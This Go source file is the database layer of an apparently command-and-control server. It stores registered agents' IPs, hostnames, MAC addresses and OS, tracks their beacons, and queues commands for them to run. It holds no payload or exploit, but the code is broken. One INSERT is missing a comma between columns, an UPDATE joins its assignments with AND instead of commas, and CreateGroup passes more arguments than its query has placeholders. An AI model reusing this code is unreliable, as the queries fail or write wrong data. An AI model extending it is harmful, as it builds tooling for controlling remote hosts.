package database

import (
	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/api"

	"github.com/lib/pq"
	_ "github.com/lib/pq"
)

func (model *DatabaseModel) InsertAgent(register api.RegisterAgent) bool {

	sqlStatment := `
	INSERT INTO agent (
		uuid, 
		agentname, 
		agentversion, 
		primaryip, 
		hostname, 
		mac, 
		agentos, 
		otherips,
		publicip
		) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
	`

	agent := register.Agent
	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		agent.UUID,
		agent.AgentName,
		agent.AgentVersion,
		agent.PrimaryIP,
		agent.Hostname,
		agent.MAC,
		agent.AgentOS,
		pq.Array(agent.OtherIPs),
		register.PublicIP)
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	sqlStatment = `
	INSERT INTO agentbeacon (
		uuid,
		registertime,
		lastbeacon,
		actionqueue,
		actions
	) VALUES ($1, $2, $3, $4, $5)
	`

	_, err = model.db.Exec(sqlStatment,
		agent.UUID,
		register.RegisterTime,
		register.RegisterTime,
		pq.Array([]string{}),
		pq.Array([]string{}))
	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) UpdateAgent(beacon api.BeaconAgent) bool {
	sqlStatment := `
	UPDATE agentbeacon
	SET lastbeacon = $2
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		beacon.Agent.UUID,
		beacon.BeaconTime)
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) InsertAction(action ActionModel) bool {

	sqlStatment := `
	INSERT INTO actions (
		uuid,
		agentuuid
		actioncmd,
		actionoutput
		) VALUES ($1, $2, $3, $4)
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		action.UUID,
		action.AgentUUID,
		action.ActionCmd,
		"")
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	agent, _ := model.GetAgentByID(action.AgentUUID)
	agent.Beacon.ActionQueue = append(agent.Beacon.ActionQueue, action.UUID)
	agent.Beacon.Actions = append(agent.Beacon.Actions, action.UUID)

	sqlStatment = `
	UPDATE agentbeacon
	SET actionqueue = $2 AND actions = $3
	WHERE uuid = $1;
	`

	model.mutex.Lock()
	_, err = model.db.Exec(sqlStatment,
		action.AgentUUID,
		pq.Array(agent.Beacon.ActionQueue),
		pq.Array(agent.Beacon.Actions))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}

func (model *DatabaseModel) CreateGroup(name string) bool {
	sqlStatment := `
	INSERT INTO groups (
		groupname
		) VALUES ($1)
	`

	model.mutex.Lock()
	_, err := model.db.Exec(sqlStatment,
		name,
		pq.Array([]string{}))
	model.mutex.Unlock()

	if err != nil {
		return false
	}

	return true
}
